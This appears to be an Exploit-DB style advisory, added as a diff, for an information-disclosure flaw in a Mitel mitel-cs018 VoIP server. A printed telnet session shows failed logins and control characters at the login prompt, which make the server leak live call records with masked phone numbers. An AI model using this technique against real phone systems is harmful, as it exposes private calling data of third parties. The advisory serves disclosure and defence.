@@ -1,0 +1,43 @@
+# Exploit Title: Mitel mitel-cs018 - Call Data Information Disclosure
+# Date: 2003-07-28
+# Exploit Author: Andrea Intilangelo (acme olografix / paranoici)
+# Vendor Homepage: www.mitel.com
+# Version: mitel-cs018
+# Tested on: Windows, Linux
+
+There is an interesting bug in a Mitel's servers for Voice over IP that allows to discover the numbers called and the numbers calling trought this dhcp server. This server is configurable via http interface and via telnet; in this case, if there is a call at moment of login/pass request, I've noted this:
+
+Trying 192.168.1.2...
+Connected to 192.168.1.2.
+Escape character is '^]'. 
+Username: mitel-cs018
+Password: 
+ERROR: Invalid Username/Password pair 
+Username:
+Password: 
+Username: ^X^W^E^Q^W
+Password: 
+ERROR: Invalid Username/Password pair 
+Username: Password: 
+ERROR: Invalid Username/Password pair 
+# in this moment a foreign call arrive from outside
+Username: 155 OGIN 149        11:11:55                        D 2
+156 ICIN            11:12: 6                        D 4 0xxxXxxxxx
+157 XFIC 156        11:12: 6 151            0: 9:47 D 3
+158 ICIN            11:12: 6                        D 3 0xxxXxxxxx
+159 ANSW 146        11:12:11                0: 0: 9 D 4
+160 HDIN 146        11:12:21                        D 4
+162 HREC 146        11:12:27                0: 0: 6 D 4
+163 ABND ?          11:12:37                0: 0:37 D 3 0xxxXxxxxx
+164 ICIN            11:12:43                        D 3 0xxxXxxxxx
+165 EXIC 146        11:12:54                0: 0:47 D 4
+166 ANSW 146        11:13: 0                0: 0:16 D 3
+167 HDIN 146        11:13: 6                        D 3
+169 EXIC 146        11:13:13        156     0: 0:12 D 3
+171 EXOG 149        11:13:46                0: 1:59 D 2 0xxXxxxxx
+172 XFIC 156        11:16:53 146            0: 3:40 D 3 
+# where "0xxXxxxxx" are telephone numbers
+A derives table results is:
+SEQ CODE  EXT   ACC   TIME     RX     TX   DURATION LN    DIALLED DIGITS   COST
+No.       No.   COD HH:MM:SS  FROM    TO   HH:MM:SS No.
+___ _____ ____ ____ ________  ____   ____  ____________   ______________  _______
